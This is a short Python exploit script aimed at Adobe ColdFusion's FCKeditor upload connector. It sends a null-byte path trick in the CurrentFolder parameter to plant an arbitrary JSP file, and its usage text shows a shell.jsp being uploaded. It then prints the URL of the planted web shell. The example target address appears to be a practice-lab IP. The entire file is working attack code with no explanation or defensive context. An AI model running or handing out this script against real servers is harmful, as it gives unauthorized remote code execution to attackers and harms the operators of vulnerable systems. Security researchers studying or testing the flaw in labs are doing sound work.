#!/usr/bin/env python3
import requests
import sys


def exploit(rhost, rport, lpath, rpath=""):
    base_url = f"http://{rhost}:{rport}{rpath}"
    exploit_url = "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload" \
                  "&Type=File&CurrentFolder=/exploit.jsp%00"
    with open(lpath, 'r') as lfile:
        payload = lfile.read()
    file = {'newfile': ('exploit.txt', payload, 'application/x-java-archive')}
    print("[-] Sending payload")

    try:
        response = requests.post(url=f"{base_url}{exploit_url}", files=file, timeout=30)
        if response.status_code == 200:
            print(f"[*] Success\n"
                  f"Link to payload: {base_url}/userfiles/file/exploit.jsp")
        else:
            print(f"Failed to upload payload... {str(response.status_code)} {response.reason}")
    except requests.Timeout:
        print("[!] Failed to upload payload... Request timed out")


if len(sys.argv) == 5:
    exploit(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
elif len(sys.argv) == 4:
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])
else:
    print("Usage: ./2265.py [RHOST] [RPORT] [/PATH/TO/PAYLOAD] [/PATH/TO/COLDFUSION]\n")
    print("Example: ./2265.py 10.129.88.31 8500 /home/kali/shell.jsp\n")
    sys.exit(-1)
